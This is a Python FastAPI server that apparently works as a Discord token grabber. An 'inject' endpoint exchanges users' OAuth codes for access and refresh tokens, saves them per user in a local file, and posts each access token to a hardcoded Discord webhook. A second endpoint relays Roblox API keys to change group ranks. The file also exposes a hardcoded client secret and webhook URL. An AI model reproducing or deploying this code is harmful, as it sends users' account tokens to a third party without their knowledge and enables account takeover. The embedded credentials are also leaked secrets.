import uvicorn
from fastapi import FastAPI, Header
from fastapi.middleware.cors import CORSMiddleware
import json
import requests
import os

client_id = '1525114197917040731'
client_sec = 'f1F3OEMctAnUuD5UJMDp_5UhjBNvIsYp'
red_uri = 'https://lovelybeans.github.io/asdf/'
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # Or specify ["http://localhost:3000"]
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/api/v1/discord/data/inject/{code}")
async def root(
        code: str,
        secret: str | None = Header(default=None)
):
    if not secret or not code or code == "null": return {'status_code': 400, 'reason': 'Bad Request'}
    if secret != "VXJTdXBlckR1cGVyR2F5T21nZ2dnCgoKMTIzNDEyMzQxMjM0MTIzNCAgICAgZmhhZWl3dWZoZTl3aGZhcGl1aGdhaXVlcnl2aWVueXZpYWV5dnRwb2V5dnRiaXc4ZWJ2dHl1dWV1ZnVmb2l1ZWY=": return {'status_code': 401, 'reason': 'Unauthorized'}

    data = {
        'client_id': client_id,
        'client_secret': client_sec,
        'grant_type': "authorization_code",
        'code': code,
        "redirect_uri": red_uri
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    print(f'Sending token api request...')
    response = requests.post('https://discord.com/api/v10/oauth2/token', data=data, headers=headers)

    response_json = response.json()

    if not response.ok:
        print(f"Error: {response.status_code} || {response.reason} || {response.text}")
        return {'status_code': response.status_code, 'reason': response.reason}

    print(f"Fetching user info...")

    user_info = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={'Authorization': f'Bearer {response_json.get("access_token")}'}
    )

    user_data = user_info.json()

    if user_info.status_code != 200:
        print(f"Error: {user_info.status_code} || {user_info.reason} || {user_info.text}")
        return {'status_code': user_info.status_code, 'reason': user_info.reason}

    print(f"""
            --- RESPONSE ---
            token | {json.dumps(response_json, indent=4)}
            user | {json.dumps(user_data, indent=4)}
            ---------------- 
        """)

    web_response = requests.post(
        "https://discord.com/api/webhooks/1525095559671844956/iIfi3Xkkf5TmxGboELtgAqzE-3JHry32KOsD4uUJ2-I3cscON0ICaXVKx8G5zz51NKlG",
        {'content': f'SUCCESS: {response_json.get("access_token")}'}
    )

    script_dir = os.path.dirname(os.path.abspath(__file__))

    filename = os.path.join(script_dir, "data.json")

    print(f"SAVED TO: {filename}")

    file_data = {}

    if os.path.exists(filename):
        with open(filename, "r") as file:
            try:
                file_data = json.load(file)
            except json.JSONDecodeError:
                file_data = {}

    file_data[str(user_data.get('id'))] = {'access_token': response_json.get('access_token'),
                                           'refresh_token': response_json.get('refresh_token')}

    print(file_data)

    with open(filename, "w") as file:
        json.dump(file_data, file, indent=4)

    return {'status_code': 200, 'reason': 'Saved info successfully!'}

@app.post('/api/v1/roblox/groups/rank-user/{group_id}/{user_id}')
async def apipost(
        group_id: str,
        user_id: str,
        cloud_key: str | None = Header(default=None, convert_underscores=False),
        package: str | None = Header(default=None)
):
    if not group_id or group_id == "null" or not user_id or user_id == "null" or not cloud_key or not package:
        return {'status_code': 400, 'reason': f'Bad Request: Missing Arguments'}

    response = requests.patch(
        f'https://apis.roblox.com/cloud/v2/groups/{group_id}/memberships/{user_id}?updateMask=role',
        headers = {'x-api-key': cloud_key, 'Content-Type': 'application/json'},
        data = package
    )

    return response.json()

if __name__ == "__main__":
    uvicorn.run('api:app', host="0.0.0.0", port=9063, reload=True)